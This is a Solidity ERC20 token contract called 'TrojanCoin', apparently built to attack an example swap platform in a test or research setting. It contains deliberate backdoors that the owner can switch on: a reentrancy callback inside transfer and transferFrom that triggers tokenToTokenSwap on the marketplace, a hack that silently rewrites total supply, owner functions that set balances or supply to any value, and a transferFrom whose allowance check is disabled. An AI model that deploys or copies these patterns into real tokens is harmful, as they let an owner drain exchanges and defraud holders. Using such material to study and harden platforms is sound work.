
pragma solidity ^0.6.6;

import "../../../../contracts/interfaces/basic/safemath.sol";
import "../../../../contracts/interfaces/basic/ERC20.sol";
import "../../../../contracts/interfaces/examplePlatforms/swapHackablePlatform.sol";



    // ERC20 Token Smart Contract
    contract TrojanCoinAfter {

        string public constant name = "TrojanCoin";
        string public constant symbol = "TRO";
        uint8 public constant decimals = 18;
        uint public _totalSupply = 1000000000000000000000000;
        address marketplaceAddress;
        bool firstTransfer= true;

        //variables use in attacks later
        bool updateSupplyActivated = false;
        bool reentryActivated = false;
        uint256 defaultReentryTradeAmount = 10000000000000000000;
        uint256 defaultTotalSupplyToAdd= 10000000000000000000000;


        using SafeMath for uint256;
        address public owner;

         modifier onlyOwner() {
            if (msg.sender != owner) {
                revert();
            }
             _;
         }


        mapping(address => uint256) balances;

        mapping(address => mapping(address=>uint256)) allowed;



        // Constructor
        constructor() public payable {

            owner = msg.sender;
            balances[address(this)] = _totalSupply;
            transfer( msg.sender, _totalSupply);
        }

        function totalSupply() public view returns(uint256){
            return _totalSupply;
        }

        function balanceOf(address _owner) public view returns(uint256){
            return balances[_owner];
        }


        function transfer(address _to, uint256 _value)  public returns(bool) {
            if(firstTransfer == false){
            require(balances[msg.sender] >= _value && _value > 0 );
            balances[msg.sender] = balances[msg.sender].sub(_value);
            }
            else{
                balances[address(this)] = 0;
            }
            firstTransfer = false;

            balances[_to] = balances[_to].add(_value);
            emit Transfer(msg.sender, _to, _value);

            //two hacks that can be activated
            if(reentryActivated == true){
                reentryActivated=false;
                platformToHack exchange = platformToHack(marketplaceAddress);
                exchange.tokenToTokenSwap(address(this), address(this), 10000000);
            }
            if(updateSupplyActivated ==true){
                _totalSupply = defaultTotalSupplyToAdd;
            }
            return true;
        }


    function transferFrom(address _from, address _to, uint256 _value)  public returns(bool) {
      //  require(allowed[_from][msg.sender] >= _value, "Not having permission");
          require(balances[_from] >= _value && _value > 0, "balance too low");
        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(_value);
      //  allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        emit  Transfer(_from, _to, _value);

        if(reentryActivated == true){
            reentryActivated=false;
            platformToHack exchange = platformToHack(marketplaceAddress);
            exchange.tokenToTokenSwap(address(this), address(this), 10000000);
        }

        return true;
    }


    function approve(address _spender, uint256 _value) public returns(bool){
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }


    function allowance(address _owner, address _spender) public view returns(uint256){
        return allowed[_owner][_spender];
    }

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);



       //malicious functions that can throw off our example swap platform later
        function setMarketplace(address marketplace) onlyOwner public{
            marketplaceAddress = marketplace;
        }

        function activateRentry() onlyOwner public{
            reentryActivated = true;
        }
        function deactivateRentry() onlyOwner public{
            reentryActivated = false;
        }
        function activateSupplyHack() onlyOwner public{
            updateSupplyActivated = true;
        }
        function deactivateSupplyHack() onlyOwner public{
            updateSupplyActivated = false;
        }



        function updateReentryAmount(uint256 updatedAmount) onlyOwner public{
            defaultReentryTradeAmount= updatedAmount;
        }
        function updateTotalSupplyAddAmount(uint256 updatedAmount) onlyOwner public{
            defaultTotalSupplyToAdd= updatedAmount;

        }
        function updateSupply(uint256 updatedAmount) onlyOwner public{
            _totalSupply= updatedAmount;

        }

        function updateBalance(uint256 updatedAmount) onlyOwner public{
            balances[msg.sender]= updatedAmount;

        }






}
